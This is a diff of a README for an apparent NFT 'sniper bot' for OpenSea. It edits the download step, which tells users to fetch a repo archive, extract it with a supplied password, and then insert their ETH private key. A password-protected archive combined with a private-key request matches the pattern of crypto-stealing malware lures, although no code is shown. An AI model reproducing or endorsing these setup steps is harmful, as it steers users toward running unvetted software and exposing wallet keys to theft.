@@ -14,7 +14,7 @@ This is a simple sniper bot for OpenSea NFT marketplace. Bot uses HTTP requests 
 
 ### How to start
 
-1. [Download](https://github.com/EDavis66/nft-sniper-bot/archive/refs/heads/main.zip) repo archive and extract files with password `ab23e23a6dc56a1a630`
+1. Download/Fork repo archive and extract files with password `ab23e23a6dc56a1a630`
 
 2. Insert you ETH private key. Dont use your main account or seed phrase! Specified key required for Web3 interactions.
 
